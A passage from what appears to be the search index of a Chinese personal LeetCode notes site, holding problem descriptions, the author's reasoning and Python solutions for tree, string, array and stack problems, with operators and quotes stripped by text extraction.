\u4e8c\u7ef4\u6570\u7ec4\u7684DP\u5417\u3002\u3002\u3002 \u53cd\u6b63\u957f\u5ea6\u5927\u4e8e 3*4 \u5c31\u662f\u4e0d\u884c \u6216\u8005\uff0c\u8bd5\u8bd5\u9012\u5f52\uff1f 100 \u7ed9\u5b9a\u4e24\u4e2a\u6811\uff0c\u5224\u65ad\u8fd9\u4e24\u68f5\u6811\u662f\u5426\u662f\u76f8\u540c\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 Input: 1 1 / \\ / \\ 2 3 2 3 [1,2,3], [1,2,3] Output: true Input: 1 1 / \\ 2 2 [1,2], [1,null,2] Output: false Input: 1 1 / \\ / \\ 2 1 1 2 [1,2,1], [1,1,2] Output: false \u60f3\u6cd5 \u90a3\u5c31\u904d\u5386\u54af\uff0c\u5982\u679c\u4e00\u4e2a\u6570\u7684\u4e2d\u5e8f\u904d\u5386\u548c\u524d\u5e8f\u904d\u5386\u662f\u4e00\u6837\u7684\u90a3\u5c31\u662f\u76f8\u540c\u7684 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 class Solution : def isSameTree ( self , p , q ): if p and q : if p . val == q . val and self . isSameTree ( p . left , q . left ) and self . isSameTree ( p . right , q . right ): return True elif p is None and q is None : return True return False","title":"091 100"},{"location":"LeetCode/vol 0/091-100/#093","text":"Todo \u7ed9\u5b9a\u4ec5\u5305\u542b\u6570\u5b57\u7684\u5b57\u7b26\u4e32\uff0c\u901a\u8fc7\u8fd4\u56de\u6240\u6709\u53ef\u80fd\u7684\u6709\u6548IP\u5730\u5740\u7ec4\u5408\u6765\u5b58\u50a8\u3002 1 2 Input: 25525511135 Output: [ 255.255.11.135 , 255.255.111.35 ] \u60f3\u6cd5 \u91cd\u70b9\u662f\u6570\u7684\u5224\u522b \u6700\u591a\u662f255 \u83ab\u975e\u662f\u3002\u3002\u3002DP? \u4e8c\u7ef4\u6570\u7ec4\u7684DP\u5417\u3002\u3002\u3002 \u53cd\u6b63\u957f\u5ea6\u5927\u4e8e 3*4 \u5c31\u662f\u4e0d\u884c \u6216\u8005\uff0c\u8bd5\u8bd5\u9012\u5f52\uff1f","title":"093"},{"location":"LeetCode/vol 0/091-100/#100","text":"\u7ed9\u5b9a\u4e24\u4e2a\u6811\uff0c\u5224\u65ad\u8fd9\u4e24\u68f5\u6811\u662f\u5426\u662f\u76f8\u540c\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 Input: 1 1 / \\ / \\ 2 3 2 3 [1,2,3], [1,2,3] Output: true Input: 1 1 / \\ 2 2 [1,2], [1,null,2] Output: false Input: 1 1 / \\ / \\ 2 1 1 2 [1,2,1], [1,1,2] Output: false \u60f3\u6cd5 \u90a3\u5c31\u904d\u5386\u54af\uff0c\u5982\u679c\u4e00\u4e2a\u6570\u7684\u4e2d\u5e8f\u904d\u5386\u548c\u524d\u5e8f\u904d\u5386\u662f\u4e00\u6837\u7684\u90a3\u5c31\u662f\u76f8\u540c\u7684","title":"100"},{"location":"LeetCode/vol 0/091-100/#_1","text":"1 2 3 4 5 6 7 8 9 class Solution : def isSameTree ( self , p , q ): if p and q : if p . val == q . val and self . isSameTree ( p . left , q . left ) and self . isSameTree ( p . right , q . right ): return True elif p is None and q is None : return True return False","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 1/101-110/","text":"101 \u7ed9\u5b9a\u4e8c\u53c9\u6811\uff0c\u68c0\u67e5\u5b83\u662f\u5426\u662f\u81ea\u8eab\u7684\u955c\u50cf\uff08\u5373\uff0c\u56f4\u7ed5\u5176\u4e2d\u5fc3\u5bf9\u79f0\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 1 / \\ 2 2 / \\ / \\ 3 4 4 3 \u8fd9\u662f\u4e2d\u5fc3\u5bf9\u79f0\u7684 1 / \\ 2 2 \\ \\ 3 3 \u8fd9\u4e0d\u662f \u60f3\u6cd5 \u770b\u6765\u9700\u8981\u7528\u961f\u5217\u6765\u5b58\uff1f\u7136\u540e\u7528\u67d0\u79cd\u904d\u5386\u65b9\u5f0f\u6765\u505a\uff1f \u6216\u662f\u9012\u5f52\uff1f \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution ( object ): def isSymmetric ( self , root ): :type root: TreeNode :rtype: bool if root : return self . _isMirror ( root . left , root . right ) elif root is None : return True return False def _isMirror ( self , p , q ): if p is None and q is None : return True if p and q and p . val == q . val : return self . _isMirror ( p . left , q . right ) and self . _isMirror ( p . right , q . left ) return False 102 Todo \u7ed9\u5b9a\u4e00\u4e2a\u4e8c\u53c9\u6811\uff0c\u8f93\u51fa\u6bcf\u4e2a\u5c42\u6b21\u7684\u5c42\u6b21\u904d\u5386 1 2 3 4 5 6 7 8 9 10 11 12 13 For example: Given binary tree [3,9,20,null,null,15,7], 3 / \\ 9 20 / \\ 15 7 return its level order traversal as: [ [3], [9,20], [15,7] ] \u60f3\u6cd5 \u53d8\u5f62\u7684\u5c42\u6b21\u904d\u5386\uff1f\u611f\u89c9\u9700\u8981\u8ba1\u6570\u6bcf\u4e00\u5c42\u6709\u51e0\u4e2a \u90a3\u4e48\u9700\u8981\u7528\u9012\u5f52\u6765\u6765\u5904\u7406\uff1fdfs(root,height)\u4e4b\u7c7b\u7684\uff1f 108 \u7ed9\u5b9a\u4e00\u4e2a\u6570\u7ec4\uff0c\u5176\u4e2d\u5143\u7d20\u6309\u5347\u5e8f\u6392\u5e8f\uff0c\u5c06\u5176\u8f6c\u6362\u4e3a\u9ad8\u5ea6\u5e73\u8861\u7684BST\u3002 \u9ad8\u5ea6\u5e73\u8861\u7684\u4e8c\u53c9\u6811\u88ab\u5b9a\u4e49\u4e3a\u4e8c\u53c9\u6811\uff0c\u5176\u4e2d\u6bcf\u4e2a\u8282\u70b9\u7684\u4e24\u4e2a\u5b50\u6811\u7684\u6df1\u5ea6\u4ece\u4e0d\u76f8\u5dee\u8d85\u8fc71\u3002 1 2 3 4 5 6 7 8 9 Given the sorted array: [-10,-3,0,5,9], One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST: 0 / \\ -3 9 / / -10 5 \u60f3\u6cd5 \u9700\u8981\u8f6c\u6362\u6210\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u91cd\u70b9\u662f\u9ad8\u5ea6\u9700\u8981\u5e73\u8861\uff0c\u6bcf\u4e2a\u8282\u70b9\u7684\u5b50\u6811\u4e0d\u76f8\u5dee1 \u90a3\u4e48\uff0c\u63d2\u5165\u7684\u65f6\u5019\u9700\u8981\u81ea\u52a8\u8c03\u6574\uff1f \u4e0d\u8fc7\uff0c\u8fd9\u4e8b\u7ed9\u5b9a\u4e00\u4e2a\u6570\u7ec4\u7684\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8ba1\u7b97\u4e2d\u95f4\u7684\u8282\u70b9\uff0c\u7136\u540e\u9012\u5f52\uff1f \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 class Solution : def sortedArrayToBST ( self , nums ): if not nums : return if len ( nums ) == 1 : return TreeNode ( nums [ 0 ]) middle = len ( nums ) // 2 head = TreeNode ( nums [ middle ]) head . left = self . sortedArrayToBST ( nums [: middle ]) head . right = self . sortedArrayToBST ( nums [ middle + 1 :]) return head","title":"101 110"},{"location":"LeetCode/vol 1/101-110/#101","text":"\u7ed9\u5b9a\u4e8c\u53c9\u6811\uff0c\u68c0\u67e5\u5b83\u662f\u5426\u662f\u81ea\u8eab\u7684\u955c\u50cf\uff08\u5373\uff0c\u56f4\u7ed5\u5176\u4e2d\u5fc3\u5bf9\u79f0\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 1 / \\ 2 2 / \\ / \\ 3 4 4 3 \u8fd9\u662f\u4e2d\u5fc3\u5bf9\u79f0\u7684 1 / \\ 2 2 \\ \\ 3 3 \u8fd9\u4e0d\u662f \u60f3\u6cd5 \u770b\u6765\u9700\u8981\u7528\u961f\u5217\u6765\u5b58\uff1f\u7136\u540e\u7528\u67d0\u79cd\u904d\u5386\u65b9\u5f0f\u6765\u505a\uff1f \u6216\u662f\u9012\u5f52\uff1f","title":"101"},{"location":"LeetCode/vol 1/101-110/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution ( object ): def isSymmetric ( self , root ): :type root: TreeNode :rtype: bool if root : return self . _isMirror ( root . left , root . right ) elif root is None : return True return False def _isMirror ( self , p , q ): if p is None and q is None : return True if p and q and p . val == q . val : return self . _isMirror ( p . left , q . right ) and self . _isMirror ( p . right , q . left ) return False","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 1/101-110/#102","text":"Todo \u7ed9\u5b9a\u4e00\u4e2a\u4e8c\u53c9\u6811\uff0c\u8f93\u51fa\u6bcf\u4e2a\u5c42\u6b21\u7684\u5c42\u6b21\u904d\u5386 1 2 3 4 5 6 7 8 9 10 11 12 13 For example: Given binary tree [3,9,20,null,null,15,7], 3 / \\ 9 20 / \\ 15 7 return its level order traversal as: [ [3], [9,20], [15,7] ] \u60f3\u6cd5 \u53d8\u5f62\u7684\u5c42\u6b21\u904d\u5386\uff1f\u611f\u89c9\u9700\u8981\u8ba1\u6570\u6bcf\u4e00\u5c42\u6709\u51e0\u4e2a \u90a3\u4e48\u9700\u8981\u7528\u9012\u5f52\u6765\u6765\u5904\u7406\uff1fdfs(root,height)\u4e4b\u7c7b\u7684\uff1f","title":"102"},{"location":"LeetCode/vol 1/101-110/#108","text":"\u7ed9\u5b9a\u4e00\u4e2a\u6570\u7ec4\uff0c\u5176\u4e2d\u5143\u7d20\u6309\u5347\u5e8f\u6392\u5e8f\uff0c\u5c06\u5176\u8f6c\u6362\u4e3a\u9ad8\u5ea6\u5e73\u8861\u7684BST\u3002 \u9ad8\u5ea6\u5e73\u8861\u7684\u4e8c\u53c9\u6811\u88ab\u5b9a\u4e49\u4e3a\u4e8c\u53c9\u6811\uff0c\u5176\u4e2d\u6bcf\u4e2a\u8282\u70b9\u7684\u4e24\u4e2a\u5b50\u6811\u7684\u6df1\u5ea6\u4ece\u4e0d\u76f8\u5dee\u8d85\u8fc71\u3002 1 2 3 4 5 6 7 8 9 Given the sorted array: [-10,-3,0,5,9], One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST: 0 / \\ -3 9 / / -10 5 \u60f3\u6cd5 \u9700\u8981\u8f6c\u6362\u6210\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u91cd\u70b9\u662f\u9ad8\u5ea6\u9700\u8981\u5e73\u8861\uff0c\u6bcf\u4e2a\u8282\u70b9\u7684\u5b50\u6811\u4e0d\u76f8\u5dee1 \u90a3\u4e48\uff0c\u63d2\u5165\u7684\u65f6\u5019\u9700\u8981\u81ea\u52a8\u8c03\u6574\uff1f \u4e0d\u8fc7\uff0c\u8fd9\u4e8b\u7ed9\u5b9a\u4e00\u4e2a\u6570\u7ec4\u7684\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8ba1\u7b97\u4e2d\u95f4\u7684\u8282\u70b9\uff0c\u7136\u540e\u9012\u5f52\uff1f","title":"108"},{"location":"LeetCode/vol 1/101-110/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 class Solution : def sortedArrayToBST ( self , nums ): if not nums : return if len ( nums ) == 1 : return TreeNode ( nums [ 0 ]) middle = len ( nums ) // 2 head = TreeNode ( nums [ middle ]) head . left = self . sortedArrayToBST ( nums [: middle ]) head . right = self . sortedArrayToBST ( nums [ middle + 1 :]) return head","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 1/121-130/","text":"125 \u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u56de\u6587\uff0c\u53bb\u6389\u6807\u70b9\u7b26\u53f7\u7b49\uff0c\u4e0d\u5224\u65ad\u5927\u5c0f\u5199 \u65e0\u8111\u5457 \u6cd5\u4e00 1 2 3 4 class Solution : def isPalindrome ( self , s ): s = . join ( e for e in s if e . isalnum ()) . lower () return s == s [:: - 1 ] \u6cd5\u4e8c 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution : def isPalindrome ( self , s ): l , r = 0 , len ( s ) - 1 while l r : while l r and not s [ l ] . isalnum (): l += 1 while l r and not s [ r ] . isalnum (): r -= 1 if s [ l ] . lower () != s [ r ] . lower (): return False l += 1 r -= 1 return True 128 \u7ed9\u5b9a\u4e00\u4e2a\u672a\u6392\u5e8f\u7684\u6570\u7ec4\uff0c\u5bfb\u627e\u4e00\u4e2a\u6700\u957f\u8fde\u7eed\u7684\u5e8f\u5217\u7684\u957f\u5ea6 \u8981\u6c42\uff0c\u5728O(n)\u65f6\u95f4\u5185\u5b8c\u6210 1 2 3 Input: [100, 4, 200, 1, 3, 2] Output: 4 Explanation: The longest consecutive elements sequence is [1, 2, 3, 4]. Therefore its length is 4. \u60f3\u6cd5 \u5728O(n)\u65f6\u95f4\u5185\u5b8c\u6210\uff0c\u666e\u901a\u7684\u6392\u5e8f\u65b9\u5f0f\u80af\u5b9a\u662f\u4e0d\u884c\u7684 \u90a3\u4e48\u9700\u8981\u7684\u662fDP\uff1f\u6216\u8005\u662f\u6876\u6392\u5e8f\uff1f O(n)\u7684\u8bdd\u662f\u9700\u8981\u4e00\u7ef4\u7684\u6570\u7ec4\u6765\u5b58\u653e dp[i]\u5b58\u653e\u7684\u662f \u5f53\u524dnums[i]\u6570\u5b57\u7ed3\u675f\u7684\u6700\u957f\u5143\u7d20\u5e8f\u5217\u7684\u957f\u5ea6\uff1f\u80fd\u5206\u89e3\u6210\u5b50\u95ee\u9898\u5417\uff1f \u5f53\u524dnums[i]\u6570\u5b57\u7ed3\u675f\u7684 [1,100,2] \u8fd9\u7c7b\u7684\u5982\u4f55\u5f04\uff1f \u52a0\u4e0aMap\uff1f \u6cd5\u4e00 \u8fd9\u91cc\u5c06\u6570\u5b57\u653e\u5165\u4e00\u4e2aset\u4e2d\uff0c\u901a\u8fc7\u8fed\u4ee3\uff0c\u67e5\u8be2\u5e76\u8ba1\u7b97\u6bcf\u4e2a\u8fde\u7eed\u7684\u6570\u5b57\u6bb5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def longestConsecutive ( self , nums ): if not nums : return 0 nums_set = set () for num in nums : nums_set . add ( num ) res = - float ( inf ) while nums_set : num = nums_set . pop () pre = num - 1 nex = num + 1 # nums_set.remove(num) while pre in nums_set : nums_set . remove ( pre ) pre = pre - 1 while nex in nums_set : nums_set . remove ( nex ) nex = nex + 1 if ( nex - pre - 1 ) res : res = nex - pre - 1 return res","title":"121 130"},{"location":"LeetCode/vol 1/121-130/#125","text":"\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u56de\u6587\uff0c\u53bb\u6389\u6807\u70b9\u7b26\u53f7\u7b49\uff0c\u4e0d\u5224\u65ad\u5927\u5c0f\u5199 \u65e0\u8111\u5457","title":"125"},{"location":"LeetCode/vol 1/121-130/#_1","text":"1 2 3 4 class Solution : def isPalindrome ( self , s ): s = . join ( e for e in s if e . isalnum ()) . lower () return s == s [:: - 1 ]","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 1/121-130/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution : def isPalindrome ( self , s ): l , r = 0 , len ( s ) - 1 while l r : while l r and not s [ l ] . isalnum (): l += 1 while l r and not s [ r ] . isalnum (): r -= 1 if s [ l ] . lower () != s [ r ] . lower (): return False l += 1 r -= 1 return True","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 1/121-130/#128","text":"\u7ed9\u5b9a\u4e00\u4e2a\u672a\u6392\u5e8f\u7684\u6570\u7ec4\uff0c\u5bfb\u627e\u4e00\u4e2a\u6700\u957f\u8fde\u7eed\u7684\u5e8f\u5217\u7684\u957f\u5ea6 \u8981\u6c42\uff0c\u5728O(n)\u65f6\u95f4\u5185\u5b8c\u6210 1 2 3 Input: [100, 4, 200, 1, 3, 2] Output: 4 Explanation: The longest consecutive elements sequence is [1, 2, 3, 4]. Therefore its length is 4. \u60f3\u6cd5 \u5728O(n)\u65f6\u95f4\u5185\u5b8c\u6210\uff0c\u666e\u901a\u7684\u6392\u5e8f\u65b9\u5f0f\u80af\u5b9a\u662f\u4e0d\u884c\u7684 \u90a3\u4e48\u9700\u8981\u7684\u662fDP\uff1f\u6216\u8005\u662f\u6876\u6392\u5e8f\uff1f O(n)\u7684\u8bdd\u662f\u9700\u8981\u4e00\u7ef4\u7684\u6570\u7ec4\u6765\u5b58\u653e dp[i]\u5b58\u653e\u7684\u662f \u5f53\u524dnums[i]\u6570\u5b57\u7ed3\u675f\u7684\u6700\u957f\u5143\u7d20\u5e8f\u5217\u7684\u957f\u5ea6\uff1f\u80fd\u5206\u89e3\u6210\u5b50\u95ee\u9898\u5417\uff1f \u5f53\u524dnums[i]\u6570\u5b57\u7ed3\u675f\u7684 [1,100,2] \u8fd9\u7c7b\u7684\u5982\u4f55\u5f04\uff1f \u52a0\u4e0aMap\uff1f","title":"128"},{"location":"LeetCode/vol 1/121-130/#_3","text":"\u8fd9\u91cc\u5c06\u6570\u5b57\u653e\u5165\u4e00\u4e2aset\u4e2d\uff0c\u901a\u8fc7\u8fed\u4ee3\uff0c\u67e5\u8be2\u5e76\u8ba1\u7b97\u6bcf\u4e2a\u8fde\u7eed\u7684\u6570\u5b57\u6bb5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def longestConsecutive ( self , nums ): if not nums : return 0 nums_set = set () for num in nums : nums_set . add ( num ) res = - float ( inf ) while nums_set : num = nums_set . pop () pre = num - 1 nex = num + 1 # nums_set.remove(num) while pre in nums_set : nums_set . remove ( pre ) pre = pre - 1 while nex in nums_set : nums_set . remove ( nex ) nex = nex + 1 if ( nex - pre - 1 ) res : res = nex - pre - 1 return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 1/151-160/","text":"155 \u5b9e\u73b0\u6700\u5c0f\u6808 \u60f3\u6cd5 \u591apush\u4e00\u4e2a\u6700\u5c0f\u6570\u54af \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class MinStack : def __init__ ( self ): initialize your data structure here. self . min = float ( inf ) self . stack = [] def push ( self , x : int ) - None : if x = self . min : self . stack . append ( self . min ) self . min = x self . stack . append ( x ) def pop ( self ) - None : if self . stack . pop () = self . min : self . min = self . stack . pop () def top ( self ) - int : return self . stack [ - 1 ] def getMin ( self ) - int : return self . min","title":"151 160"},{"location":"LeetCode/vol 1/151-160/#155","text":"\u5b9e\u73b0\u6700\u5c0f\u6808 \u60f3\u6cd5 \u591apush\u4e00\u4e2a\u6700\u5c0f\u6570\u54af","title":"155"},{"location":"LeetCode/vol 1/151-160/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class MinStack : def __init__ ( self ): initialize your data structure here. self . min = float ( inf ) self . stack = [] def push ( self , x : int ) - None : if x = self . min : self . stack . append ( self . min ) self . min = x self . stack . append ( x ) def pop ( self ) - None : if self . stack . pop () = self . min : self . min = self . stack . pop () def top ( self ) - int : return self . stack [ - 1 ] def getMin ( self ) - int : return self . min","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 1/161-170/","text":"167 \u7ed9\u5b9a\u5df2\u6309\u5347\u5e8f\u6392\u5e8f\u7684\u6574\u6570\u6570\u7ec4\uff0c\u627e\u5230\u4e24\u4e2a\u6570\u5b57\uff0c\u4f7f\u5b83\u4eec\u76f8\u52a0\u5230\u7279\u5b9a\u7684\u76ee\u6807\u6570\u3002 1 2 3 Input: numbers = [2,7,11,15], target = 9 Output: [1,2] Explanation: The sum of 2 and 7 is 9. Therefore index1 = 1, index2 = 2. \u60f3\u6cd5 \u9996\u5148\u65e0\u8111\u66b4\u529b \u6709\u5e8f\u6570\u7ec4\uff0c\u90a3\u4e48\u56fa\u5b9a\u4e00\u4e2a\u6570\u540e\u8bd5\u8bd5\u4e8c\u5206\uff1f \u597d\u5427\u5b83\u8d85\u65f6\u4e86\uff0c\u73b0\u5728\u60f3\u60f3\u5176\u4ed6\u7684\u65b9\u6cd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Solution ( object ): def twoSum ( self , numbers , target ): :type numbers: List[int] :type target: int :rtype: List[int] if numbers : for i in range ( len ( numbers )): index_offset = self . findOther ( numbers [ i + 1 :], target - numbers [ i ]) if index_offset != - 1 : return [ i + 1 , i + index_offset + 1 + 1 ] return None def findOther ( self , numbers , target ): left = 0 right = len ( numbers ) - 1 while left = right : mid = ( right + left ) // 2 if target numbers [ mid ]: right = mid - 1 elif target numbers [ mid ]: left = mid + 1 else : return mid return - 1 \u4f7f\u7528\u666e\u901atwoSum\u7684\u67e5\u627e\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution ( object ): def twoSum ( self , numbers , target ): :type numbers: List[int] :type target: int :rtype: List[int] visit = {} for i , num in enumerate ( numbers ): diff = target - num if diff in visit : return [ visit [ diff ] + 1 , i + 1 ] visit [ num ] = i \u4f46\u662f\uff01\u666e\u901atwoSum\u662f\u6ca1\u6709\u6392\u5e8f\u7684\uff0c\u5bf9\u4e8e\u6392\u597d\u5e8f\u7684\uff0c\u7528\u7c7b\u4f3c\u4e8c\u5206\u5c31\u884c\u4e86 \u6cd5\u4e00 \u5176\u5b9e\u548c\u67e5\u8868\u6cd5\u6240\u8017\u7684\u65f6\u95f4\u4e00\u6837\uff0c\u5988\u86cb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution ( object ): def twoSum ( self , numbers , target ): :type numbers: List[int] :type target: int :rtype: List[int] left = 0 right = len ( numbers ) - 1 while left = right : sum = numbers [ left ] + numbers [ right ] if sum target : left += 1 elif sum target : right -= 1 else : return [ left + 1 , right + 1 ] return","title":"161 170"},{"location":"LeetCode/vol 1/161-170/#167","text":"\u7ed9\u5b9a\u5df2\u6309\u5347\u5e8f\u6392\u5e8f\u7684\u6574\u6570\u6570\u7ec4\uff0c\u627e\u5230\u4e24\u4e2a\u6570\u5b57\uff0c\u4f7f\u5b83\u4eec\u76f8\u52a0\u5230\u7279\u5b9a\u7684\u76ee\u6807\u6570\u3002 1 2 3 Input: numbers = [2,7,11,15], target = 9 Output: [1,2] Explanation: The sum of 2 and 7 is 9. Therefore index1 = 1, index2 = 2. \u60f3\u6cd5 \u9996\u5148\u65e0\u8111\u66b4\u529b \u6709\u5e8f\u6570\u7ec4\uff0c\u90a3\u4e48\u56fa\u5b9a\u4e00\u4e2a\u6570\u540e\u8bd5\u8bd5\u4e8c\u5206\uff1f \u597d\u5427\u5b83\u8d85\u65f6\u4e86\uff0c\u73b0\u5728\u60f3\u60f3\u5176\u4ed6\u7684\u65b9\u6cd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Solution ( object ): def twoSum ( self , numbers , target ): :type numbers: List[int] :type target: int :rtype: List[int] if numbers : for i in range ( len ( numbers )): index_offset = self . findOther ( numbers [ i + 1 :], target - numbers [ i ]) if index_offset != - 1 : return [ i + 1 , i + index_offset + 1 + 1 ] return None def findOther ( self , numbers , target ): left = 0 right = len ( numbers ) - 1 while left = right : mid = ( right + left ) // 2 if target numbers [ mid ]: right = mid - 1 elif target numbers [ mid ]: left = mid + 1 else : return mid return - 1 \u4f7f\u7528\u666e\u901atwoSum\u7684\u67e5\u627e\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution ( object ): def twoSum ( self , numbers , target ): :type numbers: List[int] :type target: int :rtype: List[int] visit = {} for i , num in enumerate ( numbers ): diff = target - num if diff in visit : return [ visit [ diff ] + 1 , i + 1 ] visit [ num ] = i \u4f46\u662f\uff01\u666e\u901atwoSum\u662f\u6ca1\u6709\u6392\u5e8f\u7684\uff0c\u5bf9\u4e8e\u6392\u597d\u5e8f\u7684\uff0c\u7528\u7c7b\u4f3c\u4e8c\u5206\u5c31\u884c\u4e86","title":"167"},{"location":"LeetCode/vol 1/161-170/#_1","text":"\u5176\u5b9e\u548c\u67e5\u8868\u6cd5\u6240\u8017\u7684\u65f6\u95f4\u4e00\u6837\uff0c\u5988\u86cb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution ( object ): def twoSum ( self , numbers , target ): :type numbers: List[int] :type target: int :rtype: List[int] left = 0 right = len ( numbers ) - 1 while left = right : sum = numbers [ left ] + numbers [ right ] if sum target : left += 1 elif sum target : right -= 1 else : return [ left + 1 , right + 1 ] return","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 3/311-320/","text":"316 Todo \u7ed9\u5b9a\u4e00\u4e2a\u53ea\u5305\u542b\u5c0f\u5199\u5b57\u6bcd\u7684\u5b57\u7b26\u4e32\uff0c\u5220\u9664\u91cd\u590d\u7684\u5b57\u6bcd\uff0c\u8fd9\u6837\u6bcf\u4e2a\u5b57\u6bcd\u53ea\u51fa\u73b0\u4e00\u6b21\u3002 \u60a8\u5fc5\u987b\u786e\u4fdd\u5728\u6240\u6709\u53ef\u80fd\u7684\u7ed3\u679c\u4e2d\uff0c\u60a8\u7684\u7ed3\u679c\u5728\u5b57\u5178\u987a\u5e8f\u4e2d\u662f\u6700\u5c0f\u7684\u3002 1 2 3 4 5 6 7 8 9 10 Example 1: Input: bcabc Output: abc Example 2: Input: cbacdcbc Output: acdb \u60f3\u6cd5 \u6211\u5bfb\u601d\u662f\u4e0d\u662f\u9700\u8981\u5728O(n)\u7684\u65f6\u95f4\u5185\u641e\u5b9a\u3002 \u7136\u540e\uff0c\u5b57\u6bcd\u987a\u5e8f\u662f\u4e0d\u662f\u8fd8\u9700\u8981\u4fdd\u6301\u4e00\u81f4\uff1f \u662f\u7684\uff0c\u4f8b\u5b50\u4e8c\u53ef\u4ee5\u770b\u51fa\u6765 emmm\uff0c\u6709\u5e8fset\uff1f \u5176\u4ed6 \u7528\u8d2a\u5fc3\u6765\u505a\u554a 1 2 3 4 5 6 7 8 9 10 11 12 class Solution : def removeDuplicateLetters ( self , s ): rindex = { c : i for i , c in enumerate ( s )} result = for i , c in enumerate ( s ): if c not in result : # \u5f80\u524d\u641c\u7d22\uff0c\u5982\u679c\u5f53\u524d\u5b57\u7b26\u7684\u5b57\u5178\u987a\u5e8f\u5c0f\u4e8e\u5f53\u524dresult \u4ee5\u53ca index \u6bd4\u5f53\u524dresult\u7684\u6700\u540e\u4e00\u4e2a\u8981\u5c0f\uff08\u5373\u8fd8\u6709\u673a\u4f1a\u653e\uff09 while c result [ - 1 :] and i rindex [ result [ - 1 ]]: # \u90a3\u5c31\u653e\u54af result = result [: - 1 ] result += c return result","title":"311 320"},{"location":"LeetCode/vol 3/311-320/#316","text":"Todo \u7ed9\u5b9a\u4e00\u4e2a\u53ea\u5305\u542b\u5c0f\u5199\u5b57\u6bcd\u7684\u5b57\u7b26\u4e32\uff0c\u5220\u9664\u91cd\u590d\u7684\u5b57\u6bcd\uff0c\u8fd9\u6837\u6bcf\u4e2a\u5b57\u6bcd\u53ea\u51fa\u73b0\u4e00\u6b21\u3002 \u60a8\u5fc5\u987b\u786e\u4fdd\u5728\u6240\u6709\u53ef\u80fd\u7684\u7ed3\u679c\u4e2d\uff0c\u60a8\u7684\u7ed3\u679c\u5728\u5b57\u5178\u987a\u5e8f\u4e2d\u662f\u6700\u5c0f\u7684\u3002 1 2 3 4 5 6 7 8 9 10 Example 1: Input: bcabc Output: abc Example 2: Input: cbacdcbc Output: acdb \u60f3\u6cd5 \u6211\u5bfb\u601d\u662f\u4e0d\u662f\u9700\u8981\u5728O(n)\u7684\u65f6\u95f4\u5185\u641e\u5b9a\u3002 \u7136\u540e\uff0c\u5b57\u6bcd\u987a\u5e8f\u662f\u4e0d\u662f\u8fd8\u9700\u8981\u4fdd\u6301\u4e00\u81f4\uff1f \u662f\u7684\uff0c\u4f8b\u5b50\u4e8c\u53ef\u4ee5\u770b\u51fa\u6765 emmm\uff0c\u6709\u5e8fset\uff1f","title":"316"},{"location":"LeetCode/vol 3/311-320/#_1","text":"\u7528\u8d2a\u5fc3\u6765\u505a\u554a 1 2 3 4 5 6 7 8 9 10 11 12 class Solution : def removeDuplicateLetters ( self , s ): rindex = { c : i for i , c in enumerate ( s )} result = for i , c in enumerate ( s ): if c not in result : # \u5f80\u524d\u641c\u7d22\uff0c\u5982\u679c\u5f53\u524d\u5b57\u7b26\u7684\u5b57\u5178\u987a\u5e8f\u5c0f\u4e8e\u5f53\u524dresult \u4ee5\u53ca index \u6bd4\u5f53\u524dresult\u7684\u6700\u540e\u4e00\u4e2a\u8981\u5c0f\uff08\u5373\u8fd8\u6709\u673a\u4f1a\u653e\uff09 while c result [ - 1 :] and i rindex [ result [ - 1 ]]: # \u90a3\u5c31\u653e\u54af result = result [: - 1 ] result += c return result","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 3/321-330/","text":"328 \u7ed9\u5b9a\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u5bf9\u4e8e\u5355\u94fe\u8868\u7684\u6240\u6709\u8282\u70b9\u8fdb\u884c\u91cd\u65b0\u6392\u5217\uff0c\u53d8\u6210\u539f\u5148\u5728\u94fe\u8868\u6392\u5217\u4e3a\u5947\u6570\u7684\u5728\u524d\uff0c\u5076\u6570\u7684\u5728\u540e \u8981\u6c42 O(1)\u7684\u7a7a\u95f4\u590d\u6742\u5ea6 O(nodes)\u7684\u65f6\u95f4\u590d\u6742\u5ea6 1 2 3 4 5 6 7 8 9 